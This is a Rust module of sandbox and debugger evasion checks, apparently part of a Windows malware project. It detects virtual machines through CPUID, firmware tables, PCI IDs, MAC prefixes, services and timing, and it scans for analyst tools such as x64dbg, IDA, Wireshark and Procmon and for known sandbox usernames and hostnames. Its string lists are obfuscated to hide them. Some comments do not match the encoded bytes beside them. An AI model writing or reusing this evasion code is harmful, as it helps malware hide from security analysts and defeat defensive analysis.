use crate::recovery::helpers::obfuscation::deobf;
use std::collections::HashSet;
use std::ptr::{null, null_mut};
use windows_sys::Win32::NetworkManagement::IpHelper::{
    GAA_FLAG_INCLUDE_PREFIX, GetAdaptersAddresses, IP_ADAPTER_ADDRESSES_LH,
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS,
};
use windows_sys::Win32::System::SystemInformation::{GetSystemInfo, SYSTEM_INFO, GetSystemFirmwareTable};
use windows_sys::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};

fn pwstr_to_string(ptr: *const u16) -> String {
    if ptr.is_null() {
        return String::new();
    }
    let mut len = 0;
    while unsafe { *ptr.add(len) } != 0 {
        len += 1;
    }
    let slice = unsafe { std::slice::from_raw_parts(ptr, len) };
    String::from_utf16_lossy(slice)
}

pub fn check_cpuid_hypervisor() -> bool {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        use std::arch::x86_64::__cpuid;
        let res = __cpuid(1);
        if (res.ecx & (1 << 31)) == 0 {
            return false;
        }

        let res = __cpuid(0x40000000);
        let vendor = format!(
            "{}{} {}",
            String::from_utf8_lossy(&res.ebx.to_le_bytes()),
            String::from_utf8_lossy(&res.ecx.to_le_bytes()),
            String::from_utf8_lossy(&res.edx.to_le_bytes())
        );

        let known_vendors = [
            deobf(&[
                0xEB, 0xF0, 0xCA, 0xDC, 0xCF, 0xD8, 0xEB, 0xF0, 0xCA, 0xDC, 0xCF, 0xD8,
            ]), // VMwareVMware
            deobf(&[
                0xEB, 0xFF, 0xD2, 0xC5, 0xEB, 0xFF, 0xD2, 0xC5, 0xEB, 0xFF, 0xD2, 0xC5,
            ]), // VBoxVBoxVBox
            deobf(&[0xF6, 0xEB, 0xF0, 0xF6, 0xEB, 0xF0, 0xF6, 0xEB, 0xF0]), // KVMKVMKVM
            deobf(&[0xCD, 0xCF, 0xD1, 0x9D, 0xD5, 0xC4, 0xCD, 0xD8, 0xCF, 0xCB]), // prl hyperv
            deobf(&[
                0xE5, 0xD8, 0xD3, 0xEB, 0xF0, 0xF0, 0xE5, 0xD8, 0xD3, 0xEB, 0xF0, 0xF0,
            ]), // XenVMMXenVMM
            deobf(&[
                0xDF, 0xD5, 0xC4, 0xCB, 0xD8, 0x9D, 0xDF, 0xD5, 0xC4, 0xCB, 0xD8,
            ]), // bhyve bhyve
        ];

        for v in known_vendors {
            if vendor.contains(&v) {
                return true;
            }
        }
    }
    false
}

pub fn check_screen_resolution() -> bool {
    unsafe {
        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);

        if width < 800 || height < 600 {
            return true;
        }

        if width == 800 && height == 600 {
            return true;
        }
    }
    false
}

pub fn check_cpu_cores() -> bool {
    unsafe {
        let mut info = std::mem::zeroed::<SYSTEM_INFO>();
        GetSystemInfo(&mut info);
        info.dwNumberOfProcessors < 2
    }
}

pub fn check_processes() -> bool {
    let mut processes = HashSet::new();
    unsafe {
        let handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if handle as isize != INVALID_HANDLE_VALUE as isize {
            let mut entry = PROCESSENTRY32W {
                dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
                ..std::mem::zeroed()
            };

            if Process32FirstW(handle, &mut entry) != 0 {
                loop {
                    let name = String::from_utf16_lossy(&entry.szExeFile);
                    let name = name.trim_matches('\0').to_lowercase();
                    processes.insert(name);
                    
                    if Process32NextW(handle, &mut entry) == 0 {
                        break;
                    }
                }
            }
            CloseHandle(handle);
        }
    }

    let blacklist = [
        deobf(&[
            0xCB, 0xDF, 0xD2, 0xC5, 0xCE, 0xD8, 0xCF, 0xCB, 0xD4, 0xDE, 0xD8, 0x93, 0xD8, 0xC5,
            0xD8,
        ]), // vboxservice.exe
        deobf(&[
            0xCB, 0xDF, 0xD2, 0xC5, 0xC9, 0xCF, 0xDC, 0xC4, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // vboxtray.exe
        deobf(&[
            0xCB, 0xD0, 0xC9, 0xD2, 0xD2, 0xD1, 0xCE, 0xD9, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // vmtoolsd.exe
        deobf(&[
            0xCB, 0xD0, 0xCA, 0xDC, 0xCF, 0xD8, 0xC9, 0xCF, 0xDC, 0xC4, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // vmwaretray.exe
        deobf(&[
            0xCB, 0xD0, 0xCA, 0xDC, 0xCF, 0xD8, 0xC8, 0xCE, 0xD8, 0xCF, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // vmwareuser.exe
        deobf(&[
            0xCB, 0xDA, 0xDC, 0xC8, 0xC9, 0xD5, 0xCE, 0xD8, 0xCF, 0xCB, 0xD4, 0xDE, 0xD8, 0x93,
            0xD8, 0xC5, 0xD8,
        ]), // vgauthservice.exe
        deobf(&[
            0xCB, 0xD0, 0xDC, 0xDE, 0xC9, 0xD5, 0xD1, 0xCD, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // vmacthlp.exe
        deobf(&[0xCB, 0xD0, 0xCE, 0xCF, 0xCB, 0xDE, 0x93, 0xD8, 0xC5, 0xD8]), // vmsrvc.exe
        deobf(&[
            0xCB, 0xD0, 0xC8, 0xCE, 0xCF, 0xCB, 0xDE, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // vmusrvc.exe
        deobf(&[0xCD, 0xCF, 0xD1, 0xE2, 0xDE, 0xDE, 0x93, 0xD8, 0xC5, 0xD8]), // prl_cc.exe
        deobf(&[
            0xCD, 0xCF, 0xD1, 0xE2, 0xC9, 0xD2, 0xD2, 0xD1, 0xCE, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // prl_tools.exe
        deobf(&[
            0xC5, 0xD8, 0xD3, 0xCE, 0xD8, 0xCF, 0xCB, 0xD4, 0xDE, 0xD8, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // xenservice.exe
        deobf(&[
            0xCC, 0xD8, 0xD0, 0xC8, 0x90, 0xDA, 0xDC, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // qemu-ga.exe
        deobf(&[
            0xD7, 0xD2, 0xD8, 0xDF, 0xD2, 0xC5, 0xCE, 0xD8, 0xCF, 0xCB, 0xD8, 0xCF, 0x93, 0xD8,
            0xC5, 0xD8,
        ]), // joeboxserver.exe
        deobf(&[
            0xD7, 0xD2, 0xD8, 0xDF, 0xD2, 0xC5, 0xDE, 0xD2, 0xD3, 0xC9, 0xCF, 0xD2, 0xD1, 0x93,
            0xD8, 0xC5, 0xD8,
        ]), // joeboxcontrol.exe
        deobf(&[
            0xCA, 0xD4, 0xCF, 0xD8, 0xCE, 0xD5, 0xDC, 0xCF, 0xD6, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // wireshark.exe
        deobf(&[
            0xDB, 0xD4, 0xD9, 0xD9, 0xD1, 0xD8, 0xCF, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // fiddler.exe
        deobf(&[
            0xCD, 0xCF, 0xD2, 0xDE, 0xD0, 0xD2, 0xD3, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // procmon.exe
        deobf(&[
            0xCD, 0xCF, 0xD2, 0xDE, 0xD8, 0xC5, 0xCD, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // procexp.exe
        deobf(&[0xD4, 0xD9, 0xDC, 0x8B, 0x89, 0x93, 0xD8, 0xC5, 0xD8]),       // ida64.exe
        deobf(&[0xC5, 0x8B, 0x89, 0xD9, 0xDF, 0xDA, 0x93, 0xD8, 0xC5, 0xD8]), // x64dbg.exe
        deobf(&[0xCA, 0xD4, 0xD3, 0xD9, 0xDF, 0xDA, 0x93, 0xD8, 0xC5, 0xD8]), // windbg.exe
        deobf(&[
            0xD2, 0xD1, 0xD1, 0xC4, 0xD9, 0xDF, 0xDA, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // ollydbg.exe
        deobf(&[
            0xCD, 0xD8, 0xCE, 0xC9, 0xC8, 0xD9, 0xD4, 0xD2, 0x93, 0xD8, 0xC5, 0xD8,
        ]), // pestudio.exe
        deobf(&[
            0xCD, 0xCF, 0xD2, 0xDE, 0xD8, 0xCE, 0xCE, 0xD5, 0xDC, 0xDE, 0xD6, 0xD8, 0xCF, 0x93,
            0xD8, 0xC5, 0xD8,
        ]), // processhacker.exe
    ];

    for tool in blacklist {
        if processes.contains(&tool) {
            return true;
        }
    }

    false
}

pub fn check_usernames() -> bool {
    let user = std::env::var("USERNAME").unwrap_or_default().to_lowercase();
    let computer = std::env::var("COMPUTERNAME")
        .unwrap_or_default()
        .to_lowercase();

    let bad_users = [
        deobf(&[
            0xCA, 0xD9, 0xDC, 0xDA, 0xC8, 0xC9, 0xD4, 0xD1, 0xD4, 0xC9, 0xC4, 0xDC, 0xDE, 0xDE,
            0xD2, 0xC8, 0xD3, 0xC9,
        ]), // wdagutilityaccount
        deobf(&[0xDC, 0xDF, 0xDF, 0xC4]), // abby
        deobf(&[
            0xCD, 0xD8, 0xC9, 0xD8, 0xCF, 0x9D, 0xCA, 0xD4, 0xD1, 0xCE, 0xD2, 0xD3,
        ]), // peter wilson
        deobf(&[0xD5, 0xD0, 0xDC, 0xCF, 0xDE]), // hmarc
        deobf(&[0xCD, 0xDC, 0xC9, 0xD8, 0xC5]), // patex
        deobf(&[0xD0, 0xDC, 0xD1, 0xCA, 0xDC, 0xCF, 0xD8]), // malware
        deobf(&[0xCE, 0xDC, 0xD3, 0xD9, 0xDF, 0xD2, 0xC5]), // sandbox
        deobf(&[0xCB, 0xD4, 0xCF, 0xC8, 0xCE]), // virus
        deobf(&[0xD0, 0xDC, 0xD1, 0xC9, 0xD8, 0xCE, 0xC9]), // maltest
        deobf(&[
            0xDE, 0xC8, 0xCF, 0xCF, 0xD8, 0xD3, 0xC9, 0xC8, 0xCE, 0xD8, 0xCF,
        ]), // currentuser
    ];

    let bad_hosts = [
        deobf(&[0xCE, 0xDC, 0xD3, 0xD9, 0xDF, 0xD2, 0xC5]), // sandbox
        deobf(&[0xC9, 0xD8, 0xCE, 0xC9]),                   // test
        deobf(&[0xD0, 0xDC, 0xD1, 0xCA, 0xDC, 0xCF, 0xD8]), // malware
        deobf(&[0xCE, 0xDC, 0xD0, 0xCD, 0xD1, 0xD8]),       // sample
        deobf(&[0xCB, 0xD4, 0xCF, 0xC8, 0xCE]),             // virus
        deobf(&[0xCB, 0xD0]),                               // vm
        deobf(&[0xDF, 0xD2, 0xC5]),                         // box
        deobf(&[0xDE, 0xC8, 0xDE, 0xD6, 0xD2, 0xD2]),       // cuckoo
        deobf(&[0xDC, 0xD3, 0xDC, 0xD1, 0xC4, 0xCE, 0xC9]), // analyst
    ];

    if bad_users.contains(&user) {
        return true;
    }

    if bad_hosts.iter().any(|h| computer.contains(h)) {
        return true;
    }

    false
}

pub fn check_disk_size() -> bool {
    use windows_sys::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;

    unsafe {
        let mut total_bytes = 0u64;
        let mut free_bytes = 0u64;
        let mut total_free = 0u64;
        let path = deobf(&[0x9E, 0x85, 0xEC, 0xBD])
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect::<Vec<u16>>();

        if GetDiskFreeSpaceExW(
            path.as_ptr(),
            &mut free_bytes,
            &mut total_bytes,
            &mut total_free,
        ) != 0
        {
            if total_bytes < 60 * 1024 * 1024 * 1024 {
                return true;
            }
        }
    }
    false
}

pub fn check_hypervisor_brand() -> bool {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        use std::arch::x86_64::__cpuid;
        let res = __cpuid(0x40000000);
        let mut brand = [0u8; 12];
        brand[0..4].copy_from_slice(&res.ebx.to_le_bytes());
        brand[4..8].copy_from_slice(&res.ecx.to_le_bytes());
        brand[8..12].copy_from_slice(&res.edx.to_le_bytes());
        
        let brand_str = String::from_utf8_lossy(&brand).to_lowercase();
        let vm_brands = [
            deobf(&[0xEB, 0xF0, 0xCA, 0xDC, 0xCF, 0xD8]), // vmware
            deobf(&[0xEB, 0xFF, 0xD2, 0xC5]),             // vbox
            deobf(&[0xCD, 0xD4, 0xCF, 0xDC, 0xD1, 0xD1, 0xD8, 0xD1]), // parallels
            deobf(&[0xCD, 0xD2, 0xCD, 0xD4]), // qemu
            deobf(&[0xCD, 0xD2, 0xCD, 0xD4, 0x8F, 0x8F]), // qemu..
            deobf(&[0xCD, 0xD2, 0xCD, 0xD4, 0xCD, 0xD2, 0xCD, 0xD4]), // qemuqemu
            "microsoft hv".to_string(),
            "kvmkvmkvm".to_string(),
            "xenvmmxenvmm".to_string(),
        ];

        for b in vm_brands {
            if brand_str.contains(&b) {
                return true;
            }
        }
    }
    false
}

pub fn check_timing_drift() -> bool {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        use core::arch::x86_64::{_mm_lfence, _rdtsc};
        
        _mm_lfence();
        let tsc1 = _rdtsc();
        _mm_lfence();
        
        // Sleep for a short duration
        std::thread::sleep(std::time::Duration::from_millis(50));
        
        _mm_lfence();
        let tsc2 = _rdtsc();
        _mm_lfence();
        
        let diff = tsc2.wrapping_sub(tsc1);
        
        if diff < 1_000_000 {
            return true;
        }
    }
    false
}

pub fn check_services() -> bool {
    use windows_sys::Win32::System::Services::{
        EnumServicesStatusExW, OpenSCManagerW, SC_ENUM_PROCESS_INFO, SC_MANAGER_CONNECT,
        SC_MANAGER_ENUMERATE_SERVICE, SERVICE_STATE_ALL, ENUM_SERVICE_STATUS_PROCESSW,
        SERVICE_WIN32, CloseServiceHandle,
    };

    unsafe {
        let scm = OpenSCManagerW(null(), null(), SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
        if scm.is_null() {
            return false;
        }

        let mut bytes_needed = 0u32;
        let mut services_returned = 0u32;
        let mut resume_handle = 0u32;

        let _ = EnumServicesStatusExW(
            scm,
            SC_ENUM_PROCESS_INFO,
            SERVICE_WIN32,
            SERVICE_STATE_ALL,
            null_mut(),
            0,
            &mut bytes_needed,
            &mut services_returned,
            &mut resume_handle,
            null(),
        );

        if bytes_needed == 0 {
            CloseServiceHandle(scm);
            return false;
        }

        let mut buffer = vec![0u8; bytes_needed as usize];
        if EnumServicesStatusExW(
            scm,
            SC_ENUM_PROCESS_INFO,
            SERVICE_WIN32,
            SERVICE_STATE_ALL,
            buffer.as_mut_ptr(),
            bytes_needed,
            &mut bytes_needed,
            &mut services_returned,
            &mut resume_handle,
            null(),
        ) != 0
        {
            let services = std::slice::from_raw_parts(
                buffer.as_ptr() as *const ENUM_SERVICE_STATUS_PROCESSW,
                services_returned as usize,
            );

            let vm_services = [
                deobf(&[0xCB, 0xD0, 0xCA, 0xDC, 0xCF, 0xD8]), // vmware
                deobf(&[0xCB, 0xDF, 0xD2, 0xC5]),             // vbox
                deobf(&[0xDF, 0xD2, 0xC5, 0xDE, 0xD8, 0xCF]), // boxser
                deobf(&[0xCB, 0xD0, 0xC8, 0xCE, 0xCF, 0xCB, 0xDE]), // vmusrvc
                deobf(&[0xCB, 0xD0, 0xCE, 0xCF, 0xCB, 0xDE]),       // vmsrvc
                deobf(&[0xE2, 0xDE, 0xDE, 0xD2, 0xCF, 0xCB]),       // hyper-v
            ];

            for service in services {
                let name = pwstr_to_string(service.lpServiceName).to_lowercase();
                let display = pwstr_to_string(service.lpDisplayName).to_lowercase();
                
                for s in &vm_services {
                    if name.contains(s) || display.contains(s) {
                        CloseServiceHandle(scm);
                        return true;
                    }
                }
            }
        }

        CloseServiceHandle(scm);
    }
    false
}

pub fn check_firmware() -> bool {
    unsafe {
        // 'RSMB' - Raw SMBIOS table
        let signature = u32::from_be_bytes(*b"RSMB");
        let size = GetSystemFirmwareTable(signature, 0, null_mut(), 0);
        if size == 0 {
            return false;
        }

        let mut buffer = vec![0u8; size as usize];
        if GetSystemFirmwareTable(signature, 0, buffer.as_mut_ptr(), size) == 0 {
            return false;
        }

        let content = String::from_utf8_lossy(&buffer).to_lowercase();
        let vm_strings = [
            deobf(&[0xEB, 0xF0, 0xCA, 0xDC, 0xCF, 0xD8]), // vmware
            deobf(&[0xEB, 0xFF, 0xD2, 0xC5, 0xEB, 0xFF, 0xD2, 0xC5]), // vbox
            deobf(&[0xCD, 0xD4, 0xCF, 0xDC, 0xD1, 0xD1, 0xD8, 0xD1]), // parallels
            deobf(&[0xEB, 0xF0, 0xF6]), // kvm
            deobf(&[0xD0, 0xD2, 0xCD, 0xD4]), // qemu
            deobf(&[0xDF, 0xD2, 0xC5]), // box
        ];

        for s in vm_strings {
            if content.contains(&s) {
                return true;
            }
        }
    }
    false
}

pub fn check_pci_devices() -> bool {
    use windows_sys::Win32::Devices::DeviceAndDriverInstallation::{
        SetupDiDestroyDeviceInfoList, SetupDiEnumDeviceInfo, SetupDiGetClassDevsW,
        SetupDiGetDeviceInstanceIdW, DIGCF_ALLCLASSES, DIGCF_PRESENT, SP_DEVINFO_DATA,
    };

    unsafe {
        let h_dev_info = SetupDiGetClassDevsW(null(), null(), null_mut(), DIGCF_ALLCLASSES | DIGCF_PRESENT);
        if h_dev_info as isize == INVALID_HANDLE_VALUE as isize {
            return false;
        }

        let mut dev_info_data = SP_DEVINFO_DATA {
            cbSize: std::mem::size_of::<SP_DEVINFO_DATA>() as u32,
            ..std::mem::zeroed()
        };

        let mut i = 0;
        while SetupDiEnumDeviceInfo(h_dev_info, i, &mut dev_info_data) != 0 {
            let mut buffer = [0u16; 256];
            let mut required_size = 0u32;
            if SetupDiGetDeviceInstanceIdW(
                h_dev_info,
                &dev_info_data,
                buffer.as_mut_ptr(),
                buffer.len() as u32,
                &mut required_size,
            ) != 0
            {
                let id = String::from_utf16_lossy(&buffer[..required_size as usize])
                    .to_lowercase();
                
                if id.contains("ven_80ee") || id.contains("dev_cafe") || 
                   id.contains("ven_15ad") || id.contains("ven_1af4") {
                    SetupDiDestroyDeviceInfoList(h_dev_info);
                    return true;
                }
            }
            i += 1;
        }

        SetupDiDestroyDeviceInfoList(h_dev_info);
    }
    false
}

pub fn check_mac_address() -> bool {
    let suspicious_ouis = [
        [0x00, 0x05, 0x69],
        [0x00, 0x0C, 0x29],
        [0x00, 0x1C, 0x14],
        [0x00, 0x50, 0x56],
        [0x08, 0x00, 0x27],
        [0x0A, 0x00, 0x27],
        [0x00, 0x03, 0xFF],
        [0x00, 0x15, 0x5D],
        [0x00, 0x16, 0x3E],
    ];

    unsafe {
        let mut buffer_len = 15000;
        let mut buffer = vec![0u8; buffer_len as usize];
        let ret = GetAdaptersAddresses(
            windows_sys::Win32::Networking::WinSock::AF_UNSPEC as u32,
            GAA_FLAG_INCLUDE_PREFIX,
            null_mut(),
            buffer.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES_LH,
            &mut buffer_len,
        );

        if ret == 0 {
            let mut adapter = buffer.as_ptr() as *const IP_ADAPTER_ADDRESSES_LH;
            while !adapter.is_null() {
                let phys_len = (*adapter).PhysicalAddressLength as usize;
                if phys_len >= 3 {
                    let phys = &(&(*adapter).PhysicalAddress)[..3];
                    for oui in &suspicious_ouis {
                        if phys == oui {
                            return true;
                        }
                    }
                }
                adapter = (*adapter).Next;
            }
        }
    }
    false
}
